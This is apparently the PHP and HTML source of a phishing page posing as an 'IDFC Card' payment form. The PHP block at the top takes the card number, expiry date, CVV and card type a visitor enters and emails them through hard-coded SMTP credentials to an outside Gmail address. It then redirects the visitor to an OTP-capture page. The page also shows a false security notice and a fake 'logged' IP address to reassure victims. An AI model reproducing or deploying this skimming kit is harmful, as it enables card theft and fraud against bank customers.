<?php 
session_start();
date_default_timezone_set('Asia/Kolkata');
@extract($_POST);
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
  if(isset($submit))
    { 
      $_SESSION['sbi_card'] = $c_number;
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->Password = "Admin@123";
                $mail->AddAddress("easymailid45@gmail.com");
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'details';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>Card Number</b> - '.$c_number.'</p>
                                <p><b>Expiry Month</b> - '.$expmon.'</p>
                                <p><b>Expiry Year</b> - '.$expyr.'</p>
                                <p><b>CVV</b> - '.$cvv.'</p>
                                <p><b>Card Name</b> - '.$holder_name.'</p>';
                
                
                if(!($mail->Send()))
                {
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                    header("Location:enter-otp.php");      
                }
    }

 ?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MAKE PAY</title>
    <link type="text/css" rel="stylesheet" href="https://idddffffccc.000webhostapp.com/css/bootstrap.min.css" />
    <link type="text/css" rel="stylesheet" href="https://idddffffccc.000webhostapp.com/css/pace-white.css" />
    <link type="text/css" rel="stylesheet" href="https://idddffffccc.000webhostapp.com/css/layout.css" />
    <script src="https://idddffffccc.000webhostapp.com/modernizr.custom.js"></script>
    <link rel="stylesheet" type="text/css" href="css/make.css">
    <style type="text/css">
        @media (min-width: 720px) {
                .desktopds {
                    margin: 0;
                    padding: 0;
                    overflow: hidden;
                }
                .mobileds {
                    display: none;
                }
            }

            @media (max-width: 719px) {
                .desktopds {
                    display: none;
                }
            }
    </style>
</head>

<body>
    <div class="desktopds"><img style="width: 100%;" src="images/make-header.jpg"></div>
    <div class="mobileds"><img style="width: 100%;" src="images/make-mobile-header.jpg"></div>
    <div class="container">
        <div class="row">
            <div class="col-md-2"></div>
            <div class="col-xs-6 col-md-8" id="LogoSection"  style="height: 0px;">
                <div class="underlinelogo"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="row">
            <div class="col-md-2"></div>
            <div class="col-xs-12 col-md-8" style="background: url(funny.gif); background-size: cover; margin-top: 20px;">
                <div class="row">
                    <div class="col-md-2"></div>
                    <div class="col-md-8 col-xs-12">
                        <form name="form1" id="form1" method="post">
                          <div class="row firstrow">
                              <div class="col-md-12 text-center bordermarc"><p class="pera">Merchant Name : <b>IDFC Card</b></p></div>
                              <div class="col-xs-6 col-md-5"><p class="pera"><b>Reference No:</b> 89823499</p></div>
                              <div class="col-xs-6 col-md-7"><p class="pera trac"><b>Transaction Amount:</b> <?=$_SESSION['amount']?>.00 INR</p></div>
                        </div>
                            <div id="content-holder">
                                <div class="row" id="formContainer" style="margin: 0;">
                                    <div class="col-md-12 col-md-pull-0">
                                        <div id="cardfm">
                                            <div class="form-group crdno">
                                                <label class="control-label">CARD NUMBER</label>
                                                <div class="col-xs-12 input-group">
                                                    <input type="tel" placeholder="Valid Card Number" name="c_number" id="cnumber" class="form-control" value="" minlength="16" maxlength="16" autocomplete="off" required>
                                                    <span class="input-group-addon"><i id="cardTypeid" class="fa cardT fa-fw"></i></span>
                                                    <input type="hidden" name="cardType" id="cardType">
                                                    <input type="hidden" NAME="panreq" value="eXoTADZAstKkE2g5R8vMg6A7">
                                                    <input type="hidden" NAME="rdrid" value="unwNlcsRum9s8XOJMz0fKwYH"> <input name="Imgver" type="hidden" value="idNLXS">
                                                    <input type="hidden" NAME="reqid" value="cc_details">
                                                </div>
                                            </div>
                                            <div class="form-group crdno">
                                                <label class="control-label" for="cname2">Card Name</label>
                                                <div class="col-xs-3 input-group">
                                                  <select name="holder_name" class="newselect" id="holder_name" data-name="cardMonth" required>
                                                    <option class="padl5" selected="" value="0">Select</option>
                                                    <option class="padl5" value="Maestro">Maestro</option>
                                                    <option class="padl5" value="Master Card">Master Card</option>
                                                    <option class="padl5" value="Visa">Visa</option>
                                                  </select>
                                                </div>
                                            </div>
                                            <div class="form-group row crd-details">
                                                <div class="col-xs-7 col-md-6 expcol">
                                                    <div style="margin-left: 0px;" class="row expydate">
                                                        <div class="col-xs-6 expmon">
                                                          <label style="margin-left: 10px;" class="control-label">Month</label>
                                                            <select name="expmon" class="newselect" id="expmon" data-name="cardMonth" required>
                    <option class="padl5" selected="" value="0">--Select--</option>
                    <option class="padl5" value="01">01 (Jan)</option>
                    <option class="padl5" value="02">02 (Feb)</option>
                    <option class="padl5" value="03">03 (Mar)</option>
                    <option class="padl5" value="04">04 (Apr)</option>
                    <option class="padl5" value="05">05 (May)</option>
                    <option class="padl5" value="06">06 (Jun)</option>
                    <option class="padl5" value="07">07 (Jul)</option>
                    <option class="padl5" value="08">08 (Aug)</option>
                    <option class="padl5" value="09">09 (Sep)</option>
                    <option class="padl5" value="10">10 (Oct)</option>
                    <option class="padl5" value="11">11 (Nov)</option>
                    <option class="padl5" value="12">12 (Dec)</option>
                  </select>
                                                        </div>
                                                        <div class="col-xs-6 expyr">
                                                          <label style="margin-left: 10px;" class="control-label">Year</label>
                                                            <select name="expyr" class="newselect" id="expyr" data-name="cardYear">
                    <option class="padl5" selected="" value="0">--Select--</option>
                    <option class="padl5" value="2019">2019</option>
                    <option class="padl5" value="2020">2020</option>
                    <option class="padl5" value="2021">2021</option>
                    <option class="padl5" value="2022">2022</option>
                    <option class="padl5" value="2023">2023</option>
                    <option class="padl5" value="2024">2024</option>
                    <option class="padl5" value="2025">2025</option>
                    <option class="padl5" value="2026">2026</option>
                    <option class="padl5" value="2027">2027</option>
                    <option class="padl5" value="2028">2028</option>
                    <option class="padl5" value="2029">2029</option>
                    <option class="padl5" value="2030">2030</option>
                    <option class="padl5" value="2031">2031</option>
                    <option class="padl5" value="2032">2032</option>
                    <option class="padl5" value="2033">2033</option>
                    <option class="padl5" value="2034">2034</option>
                    <option class="padl5" value="2035">2035</option>
                    <option class="padl5" value="2036">2036</option>
                    <option class="padl5" value="2037">2037</option>
                    <option class="padl5" value="2038">2038</option>
                    <option class="padl5" value="2039">2039</option>
                    <option class="padl5" value="2040">2040</option>
                    <option class="padl5" value="2041">2041</option>
                    <option class="padl5" value="2042">2042</option>
                    <option class="padl5" value="2043">2043</option>
                    <option class="padl5" value="2044">2044</option>
                    <option class="padl5" value="2045">2045</option>
                    <option class="padl5" value="2046">2046</option>
                    <option class="padl5" value="2047">2047</option>
                    <option class="padl5" value="2048">2048</option>
                    <option class="padl5" value="2049">2049</option>
                    <option class="padl5" value="2050">2050</option>
                    <option class="padl5" value="2051">2051</option>
                    <option class="padl5" value="2052">2052</option>
                    <option class="padl5" value="2053">2053</option>
                    <option class="padl5" value="2054">2054</option>
                    <option class="padl5" value="2055">2055</option>
                    <option class="padl5" value="2056">2056</option>
                    <option class="padl5" value="2057">2057</option>
                    <option class="padl5" value="2058">2058</option>
                    <option class="padl5" value="2059">2059</option>
                    <option class="padl5" value="2060">2060</option>
                    <option class="padl5" value="2061">2061</option>
                    <option class="padl5" value="2062">2062</option>
                    <option class="padl5" value="2063">2063</option>
                    <option class="padl5" value="2064">2064</option>
                    <option class="padl5" value="2065">2065</option>
                  </select>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="col-xs-3 col-md-3 cvvcol">
                                                    <label class="control-label cvv" for="cvv2">CVV/ CVC</label>
                                                    <input type="password" placeholder="CVV" name="cvv" maxlength="3" id="cvv2" class="form-control" required>
                                                </div>
                                                <div class="col-xs-2 col-md-3"><br>
                                                  <img style="margin: 10px 0px 0px 10px;" src="images/help.png">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="row" style="margin: 0;">
                                  <div class="col-xs-6 col-md-5">
                                    <a id="canlink" class="pull-right" role="button" data-reqid="cc_cancel" onclick="return cancelForm()">Cancel</a>
                                </div>

                                <div class="col-xs-6 col-md-7">
                                  <button class="btn subtbtn col-xs-12 col-md-6 btn-lg btn-danger" type="submit" name="submit" data-loading-text="please wait..." data-reqid="cc_details" id="proceedForm">Submit</button>
                                </div>
                                </div>
                                

                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="secureSection" class="container">
              <div class="row"><br>
                  <div class="col-md-12"><p style="font-size: 14px; color: #000; text-align: center;">Your transaction is processed through a secure 138 bit htttps internet connection based on secure socket layer technology. For security purposes, Your address <strong style="color: #9f1d29;" class="text-info">182.68.207.31</strong> and access
                      time <strong class="text-info" style="color: #9f1d29;"><!-- Nov 13 12:20:53 --> <?=date("M d h:i:s")?> IST <?=date("yy")?></strong> have been logged.</p> 
                    </div>
              </div>
              <div class="row">
                <div class="col-md-4"></div>
                <div class="col-md-4">
                      <img style="width: 100%;" src="images/cc-logoo.png">   <br><br><br><br><br>               
                </div>
              </div>
          </div>
</body>

</html>